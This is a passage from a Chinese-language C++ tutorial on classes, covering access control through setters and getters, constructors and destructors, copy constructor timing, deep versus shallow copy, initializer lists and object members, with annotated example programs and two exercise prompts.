<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//姓名设置可读可写</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123;</span><br><span class="line">		m_Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取年龄 </span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//设置年龄</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (age &lt; <span class="number">0</span> || age &gt; <span class="number">150</span>) &#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;你个老妖精!&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//情人设置为只写</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setLover</span><span class="params">(string lover)</span> </span>&#123;</span><br><span class="line">		m_Lover = lover;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_Name; <span class="comment">//可读可写  姓名</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> m_Age; <span class="comment">//只读  年龄</span></span><br><span class="line"></span><br><span class="line">	string m_Lover; <span class="comment">//只写  情人</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	<span class="comment">//姓名设置</span></span><br><span class="line">	p.<span class="built_in">setName</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.<span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//年龄设置</span></span><br><span class="line">	p.<span class="built_in">setAge</span>(<span class="number">50</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;年龄： &quot;</span> &lt;&lt; p.<span class="built_in">getAge</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//情人设置</span></span><br><span class="line">	p.<span class="built_in">setLover</span>(<span class="string">&quot;苍井&quot;</span>);</span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  //只写属性，不可以读取</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<p><strong>练习案例1：设计立方体类</strong></p>
<p>设计立方体类(Cube)</p>
<p>求出立方体的面积和体积</p>
<p>分别用全局函数和成员函数判断两个立方体是否相等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545533548532.png"
                      alt="1545533548532"
                ></p>
<p><strong>练习案例2：点和圆的关系</strong></p>
<p>设计一个圆形类（Circle），和一个点类（Point），计算点和圆的关系。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545533829184.png"
                      alt="1545533829184"
                ></p>
<h3 id="4-2-对象的初始化和清理"><a href="#4-2-对象的初始化和清理" class="headerlink" title="4.2 对象的初始化和清理"></a>4.2 对象的初始化和清理</h3><ul>
<li>生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全</li>
<li>C++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。</li>
</ul>
<h4 id="4-2-1-构造函数和析构函数"><a href="#4-2-1-构造函数和析构函数" class="headerlink" title="4.2.1 构造函数和析构函数"></a>4.2.1 构造函数和析构函数</h4><p>对象的<strong>初始化和清理</strong>也是两个非常重要的安全问题</p>
<p>​	一个对象或者变量没有初始状态，对其使用后果是未知</p>
<p>​	同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题</p>
<p>c++利用了<strong>构造函数</strong>和<strong>析构函数</strong>解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。</p>
<p>对象的初始化和清理工作是编译器强制要我们做的事情，因此如果<strong>我们不提供构造和析构，编译器会提供</strong></p>
<p><strong>编译器提供的构造函数和析构函数是空实现。</strong></p>
<ul>
<li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li>
<li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li>
</ul>
<p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p>
<ol>
<li>构造函数，没有返回值也不写void</li>
<li>函数名称与类名相同</li>
<li>构造函数可以有参数，因此可以发生重载</li>
<li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li>
</ol>
<p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p>
<ol>
<li>析构函数，没有返回值也不写void</li>
<li>函数名称与类名相同,在名称前加上符号  ~</li>
<li>析构函数不可以有参数，因此不可以发生重载</li>
<li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li>
</ol>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h4 id="4-2-2-构造函数的分类及调用"><a href="#4-2-2-构造函数的分类及调用" class="headerlink" title="4.2.2 构造函数的分类及调用"></a>4.2.2 构造函数的分类及调用</h4><p>两种分类方式：</p>
<p>​	按参数分为： 有参构造和无参构造</p>
<p>​	按类型分为： 普通构造和拷贝构造</p>
<p>三种调用方式：</p>
<p>​	括号法</p>
<p>​	显示法</p>
<p>​	隐式转换法</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、构造函数分类</span></span><br><span class="line"><span class="comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span></span><br><span class="line"><span class="comment">// 按照类型分类分为 普通构造和拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">		age = a;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		age = p.age;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、构造函数的调用</span></span><br><span class="line"><span class="comment">//调用无参构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//调用无参构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参的构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.1  括号法，常用</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span></span><br><span class="line">	<span class="comment">//Person p2();错误示例</span></span><br><span class="line">    <span class="comment">//Person p2;正确示例</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.2 显式法</span></span><br><span class="line">	Person p2 = <span class="built_in">Person</span>(<span class="number">10</span>); </span><br><span class="line">	Person p3 = <span class="built_in">Person</span>(p2);</span><br><span class="line">	<span class="comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.3 隐式转换法</span></span><br><span class="line">	Person p4 = <span class="number">10</span>; <span class="comment">// Person p4 = Person(10); </span></span><br><span class="line">	Person p5 = p4; <span class="comment">// Person p5 = Person(p4); </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span></span><br><span class="line">	<span class="comment">//Person p5(p4);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-2-3-拷贝构造函数调用时机"><a href="#4-2-3-拷贝构造函数调用时机" class="headerlink" title="4.2.3 拷贝构造函数调用时机"></a>4.2.3 拷贝构造函数调用时机</h4><p>C++中拷贝构造函数调用时机通常有三种情况</p>
<ul>
<li>使用一个已经创建完毕的对象来初始化一个新对象</li>
<li>值传递的方式给函数参数传值</li>
<li>以值方式返回局部对象</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = p.mAge;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数在释放内存之前调用</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">man</span><span class="params">(<span class="number">100</span>)</span></span>; <span class="comment">//p对象已经创建完毕</span></span><br><span class="line">	<span class="function">Person <span class="title">newman</span><span class="params">(man)</span></span>; <span class="comment">//调用拷贝构造函数</span></span><br><span class="line">	Person newman2 = man; <span class="comment">//拷贝构造</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Person newman3;</span></span><br><span class="line">	<span class="comment">//newman3 = man; //不是调用拷贝构造函数，赋值操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 值传递的方式给函数参数传值</span></span><br><span class="line"><span class="comment">//相当于Person p1 = p;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doWork</span><span class="params">(Person p1)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//无参构造函数</span></span><br><span class="line">	<span class="built_in">doWork</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 以值方式返回局部对象</span></span><br><span class="line"><span class="function">Person <span class="title">doWork2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p1;</span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p1 &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p = <span class="built_in">doWork2</span>();</span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line">	<span class="built_in">test03</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h4 id="4-2-4-构造函数调用规则"><a href="#4-2-4-构造函数调用规则" class="headerlink" title="4.2.4 构造函数调用规则"></a>4.2.4 构造函数调用规则</h4><p>默认情况下，c++编译器至少给一个类添加3个函数</p>
<p>1．默认构造函数(无参，函数体为空)</p>
<p>2．默认析构函数(无参，函数体为空)</p>
<p>3．默认拷贝构造函数，对属性进行值拷贝</p>
<p>构造函数调用规则如下：</p>
<ul>
<li><p>如果用户定义有参构造函数，c++不再提供默认无参构造，但是会提供默认拷贝构造</p>
</li>
<li><p>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</p>
</li>
</ul>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">		age = a;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		age = p.age;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>)</span></span>;</span><br><span class="line">	<span class="comment">//如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作</span></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄为： &quot;</span> &lt;&lt; p<span class="number">2.</span>age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造</span></span><br><span class="line">	Person p1; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">//用户提供的有参</span></span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(p2)</span></span>; <span class="comment">//此时如果用户没有提供拷贝构造，编译器会提供</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果用户提供拷贝构造，编译器不会提供其他构造函数</span></span><br><span class="line">	Person p4; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">//此时如果用户自己没有提供有参，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p6</span><span class="params">(p5)</span></span>; <span class="comment">//用户自己提供拷贝构造</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-2-5-深拷贝与浅拷贝"><a href="#4-2-5-深拷贝与浅拷贝" class="headerlink" title="4.2.5 深拷贝与浅拷贝"></a>4.2.5 深拷贝与浅拷贝</h4><p>深浅拷贝是面试经典问题，也是常见的一个坑</p>
<p>浅拷贝：简单的赋值拷贝操作</p>
<p>深拷贝：在堆区重新申请空间，进行拷贝操作</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age ,<span class="type">int</span> height) &#123;</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		m_age = age;</span><br><span class="line">		m_height = <span class="keyword">new</span> <span class="built_in">int</span>(height);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数  </span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题</span></span><br><span class="line">		m_age = p.m_age;</span><br><span class="line">		m_height = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_height);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (m_height != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_height;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_age;</span><br><span class="line">	<span class="type">int</span>* m_height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>, <span class="number">180</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1的年龄： &quot;</span> &lt;&lt; p<span class="number">1.</span>m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p<span class="number">1.</span>m_height &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄： &quot;</span> &lt;&lt; p<span class="number">2.</span>m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p<span class="number">2.</span>m_height &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p>
</blockquote>
<h4 id="4-2-6-初始化列表"><a href="#4-2-6-初始化列表" class="headerlink" title="4.2.6 初始化列表"></a>4.2.6 初始化列表</h4><p><strong>作用：</strong></p>
<p>C++提供了初始化列表语法，用来初始化属性</p>
<p><strong>语法：</strong><code>构造函数()：属性1(值1),属性2（值2）... &#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">////传统方式初始化</span></span><br><span class="line">	<span class="comment">//Person(int a, int b, int c) &#123;</span></span><br><span class="line">	<span class="comment">//	m_A = a;</span></span><br><span class="line">	<span class="comment">//	m_B = b;</span></span><br><span class="line">	<span class="comment">//	m_C = c;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化列表方式初始化</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c) :<span class="built_in">m_A</span>(a), <span class="built_in">m_B</span>(b), <span class="built_in">m_C</span>(c) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PrintPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; m_A &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mB:&quot;</span> &lt;&lt; m_B &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mC:&quot;</span> &lt;&lt; m_C &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">PrintPerson</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h4 id="4-2-7-类对象作为类成员"><a href="#4-2-7-类对象作为类成员" class="headerlink" title="4.2.7 类对象作为类成员"></a>4.2.7 类对象作为类成员</h4><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p>
<p>例如：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line">    A a；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>B类中有对象A作为成员，A为对象成员</p>
<p>那么当创建B对象时，A与B的构造和析构的顺序是谁先谁后？</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Phone</span>(string name)</span><br><span class="line">	&#123;</span><br><span class="line">		m_PhoneName = name;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Phone构造&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Phone</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Phone析构&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_PhoneName;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化列表可以告诉编译器调用哪一个构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(string 